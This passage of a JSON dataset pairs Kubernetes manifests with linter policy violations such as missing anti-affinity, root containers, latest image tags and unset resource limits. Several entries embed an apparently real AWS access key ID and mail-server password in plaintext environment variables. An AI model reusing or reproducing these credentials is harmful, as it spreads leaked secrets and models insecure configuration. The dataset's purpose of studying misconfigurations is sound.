    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: v1-notification-microservice\n  labels:\n    app: notification-restapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: notification-restapp\n  template:\n    metadata:\n      labels:\n        app: notification-restapp\n    spec:\n      containers:\n      - name: notification-service\n        image: stacksimplify/kube-notifications-microservice:3.0.0-AWS-XRay\n        ports:\n        - containerPort: 8096\n        imagePullPolicy: Always\n        env:\n        - name: AWS_MAIL_SERVER_HOST\n          value: smtp-service\n        - name: AWS_MAIL_SERVER_USERNAME\n          value: AKIASUF7HC7SQJ6BCLVS\n        - name: AWS_MAIL_SERVER_PASSWORD\n          value: BARcmLiC68wgmhTy/cQvz/E8vFzeizGqdeASNtCs6+Nv\n        - name: AWS_MAIL_SERVER_FROM_ADDRESS\n          value: stacksimplify@gmail.com\n        - name: AWS_XRAY_TRACING_NAME\n          value: V1-Notification-Microservice\n        - name: AWS_XRAY_DAEMON_ADDRESS\n          value: xray-service.default:2000\n        - name: AWS_XRAY_CONTEXT_MISSING\n          value: LOG_ERROR\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7106",
    "manifest_path": "data/manifests/the_stack_sample/sample_2581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: v1-notification-microservice\n  labels:\n    app: notification-restapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: notification-restapp\n  template:\n    metadata:\n      labels:\n        app: notification-restapp\n    spec:\n      containers:\n      - name: notification-service\n        image: stacksimplify/kube-notifications-microservice:3.0.0-AWS-XRay\n        ports:\n        - containerPort: 8096\n        imagePullPolicy: Always\n        env:\n        - name: AWS_MAIL_SERVER_HOST\n          value: smtp-service\n        - name: AWS_MAIL_SERVER_USERNAME\n          value: AKIASUF7HC7SQJ6BCLVS\n        - name: AWS_MAIL_SERVER_PASSWORD\n          value: BARcmLiC68wgmhTy/cQvz/E8vFzeizGqdeASNtCs6+Nv\n        - name: AWS_MAIL_SERVER_FROM_ADDRESS\n          value: stacksimplify@gmail.com\n        - name: AWS_XRAY_TRACING_NAME\n          value: V1-Notification-Microservice\n        - name: AWS_XRAY_DAEMON_ADDRESS\n          value: xray-service.default:2000\n        - name: AWS_XRAY_CONTEXT_MISSING\n          value: LOG_ERROR\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"notification-service\" does not have a read-only root file system"
  },
  {
    "id": "7107",
    "manifest_path": "data/manifests/the_stack_sample/sample_2581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: v1-notification-microservice\n  labels:\n    app: notification-restapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: notification-restapp\n  template:\n    metadata:\n      labels:\n        app: notification-restapp\n    spec:\n      containers:\n      - name: notification-service\n        image: stacksimplify/kube-notifications-microservice:3.0.0-AWS-XRay\n        ports:\n        - containerPort: 8096\n        imagePullPolicy: Always\n        env:\n        - name: AWS_MAIL_SERVER_HOST\n          value: smtp-service\n        - name: AWS_MAIL_SERVER_USERNAME\n          value: AKIASUF7HC7SQJ6BCLVS\n        - name: AWS_MAIL_SERVER_PASSWORD\n          value: BARcmLiC68wgmhTy/cQvz/E8vFzeizGqdeASNtCs6+Nv\n        - name: AWS_MAIL_SERVER_FROM_ADDRESS\n          value: stacksimplify@gmail.com\n        - name: AWS_XRAY_TRACING_NAME\n          value: V1-Notification-Microservice\n        - name: AWS_XRAY_DAEMON_ADDRESS\n          value: xray-service.default:2000\n        - name: AWS_XRAY_CONTEXT_MISSING\n          value: LOG_ERROR\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"notification-service\" is not set to runAsNonRoot"
  },
  {
    "id": "7108",
    "manifest_path": "data/manifests/the_stack_sample/sample_2581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: v1-notification-microservice\n  labels:\n    app: notification-restapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: notification-restapp\n  template:\n    metadata:\n      labels:\n        app: notification-restapp\n    spec:\n      containers:\n      - name: notification-service\n        image: stacksimplify/kube-notifications-microservice:3.0.0-AWS-XRay\n        ports:\n        - containerPort: 8096\n        imagePullPolicy: Always\n        env:\n        - name: AWS_MAIL_SERVER_HOST\n          value: smtp-service\n        - name: AWS_MAIL_SERVER_USERNAME\n          value: AKIASUF7HC7SQJ6BCLVS\n        - name: AWS_MAIL_SERVER_PASSWORD\n          value: BARcmLiC68wgmhTy/cQvz/E8vFzeizGqdeASNtCs6+Nv\n        - name: AWS_MAIL_SERVER_FROM_ADDRESS\n          value: stacksimplify@gmail.com\n        - name: AWS_XRAY_TRACING_NAME\n          value: V1-Notification-Microservice\n        - name: AWS_XRAY_DAEMON_ADDRESS\n          value: xray-service.default:2000\n        - name: AWS_XRAY_CONTEXT_MISSING\n          value: LOG_ERROR\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"notification-service\" has cpu request 0"
  },
  {
    "id": "7109",
    "manifest_path": "data/manifests/the_stack_sample/sample_2581.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: v1-notification-microservice\n  labels:\n    app: notification-restapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: notification-restapp\n  template:\n    metadata:\n      labels:\n        app: notification-restapp\n    spec:\n      containers:\n      - name: notification-service\n        image: stacksimplify/kube-notifications-microservice:3.0.0-AWS-XRay\n        ports:\n        - containerPort: 8096\n        imagePullPolicy: Always\n        env:\n        - name: AWS_MAIL_SERVER_HOST\n          value: smtp-service\n        - name: AWS_MAIL_SERVER_USERNAME\n          value: AKIASUF7HC7SQJ6BCLVS\n        - name: AWS_MAIL_SERVER_PASSWORD\n          value: BARcmLiC68wgmhTy/cQvz/E8vFzeizGqdeASNtCs6+Nv\n        - name: AWS_MAIL_SERVER_FROM_ADDRESS\n          value: stacksimplify@gmail.com\n        - name: AWS_XRAY_TRACING_NAME\n          value: V1-Notification-Microservice\n        - name: AWS_XRAY_DAEMON_ADDRESS\n          value: xray-service.default:2000\n        - name: AWS_XRAY_CONTEXT_MISSING\n          value: LOG_ERROR\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"notification-service\" has memory limit 0"
  },
  {
    "id": "7110",
    "manifest_path": "data/manifests/the_stack_sample/sample_2583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: dd59acr.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7111",
    "manifest_path": "data/manifests/the_stack_sample/sample_2583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: dd59acr.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7112",
    "manifest_path": "data/manifests/the_stack_sample/sample_2583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: dd59acr.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "7113",
    "manifest_path": "data/manifests/the_stack_sample/sample_2583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: dd59acr.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7114",
    "manifest_path": "data/manifests/the_stack_sample/sample_2583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: dd59acr.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "7115",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"scylla-manager-controller\" is using an invalid container image, \"docker.io/scylladb/scylla-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7116",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7117",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"scylla-manager-controller\" does not have a read-only root file system"
  },
  {
    "id": "7118",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"scylla-manager-controller\" not found"
  },
  {
    "id": "7119",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"scylla-manager-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "7120",
    "manifest_path": "data/manifests/the_stack_sample/sample_2584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: scylla-manager-controller\n  name: scylla-manager-controller\n  namespace: scylla-manager\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: scylla-manager-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: scylla-manager-controller\n    spec:\n      serviceAccountName: scylla-manager-controller\n      containers:\n      - name: scylla-manager-controller\n        image: docker.io/scylladb/scylla-operator:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - manager-controller\n        - --log-level=debug\n        resources:\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"scylla-manager-controller\" has memory limit 0"
  },
  {
    "id": "7121",
    "manifest_path": "data/manifests/the_stack_sample/sample_2585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-nginx\n  annotations:\n    cni.projectcalico.org/ipv4pools: '[\"public-ipv4-ippool\"]'\nspec:\n  containers:\n  - name: my-nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"my-nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7122",
    "manifest_path": "data/manifests/the_stack_sample/sample_2585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-nginx\n  annotations:\n    cni.projectcalico.org/ipv4pools: '[\"public-ipv4-ippool\"]'\nspec:\n  containers:\n  - name: my-nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-nginx\" does not have a read-only root file system"
  },
  {
    "id": "7123",
    "manifest_path": "data/manifests/the_stack_sample/sample_2585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-nginx\n  annotations:\n    cni.projectcalico.org/ipv4pools: '[\"public-ipv4-ippool\"]'\nspec:\n  containers:\n  - name: my-nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7124",
    "manifest_path": "data/manifests/the_stack_sample/sample_2585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-nginx\n  annotations:\n    cni.projectcalico.org/ipv4pools: '[\"public-ipv4-ippool\"]'\nspec:\n  containers:\n  - name: my-nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-nginx\" has cpu request 0"
  },
  {
    "id": "7125",
    "manifest_path": "data/manifests/the_stack_sample/sample_2585.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-nginx\n  annotations:\n    cni.projectcalico.org/ipv4pools: '[\"public-ipv4-ippool\"]'\nspec:\n  containers:\n  - name: my-nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"my-nginx\" has memory limit 0"
  },
  {
    "id": "7126",
    "manifest_path": "data/manifests/the_stack_sample/sample_2589.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200715-e9245dbb90\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "7127",
    "manifest_path": "data/manifests/the_stack_sample/sample_2589.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200715-e9245dbb90\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "7128",
    "manifest_path": "data/manifests/the_stack_sample/sample_2589.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200715-e9245dbb90\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "7129",
    "manifest_path": "data/manifests/the_stack_sample/sample_2589.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200715-e9245dbb90\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "7130",
    "manifest_path": "data/manifests/the_stack_sample/sample_2589.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200715-e9245dbb90\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "7131",
    "manifest_path": "data/manifests/the_stack_sample/sample_2590.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flagger\n  namespace: default\n  labels:\n    app: flagger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flagger\n  template:\n    metadata:\n      labels:\n        app: flagger\n      annotations:\n        prometheus.io/scrape: 'true'\n    spec:\n      serviceAccountName: flagger\n      containers:\n      - name: flagger\n        image: ghcr.io/fluxcd/flagger:1.6.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 8080\n        command:\n        - ./flagger\n        - -log-level=info\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - --quiet\n            - --tries=1\n            - --timeout=2\n            - --spider\n            - http://localhost:8080/healthz\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - --quiet\n            - --tries=1\n            - --timeout=2\n            - --spider\n            - http://localhost:8080/healthz\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 1000m\n          requests:\n            memory: 32Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: true\n          runAsUser: 10001\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"flagger\" not found"
  },
  {
    "id": "7132",
    "manifest_path": "data/manifests/the_stack_sample/sample_2591.yaml",
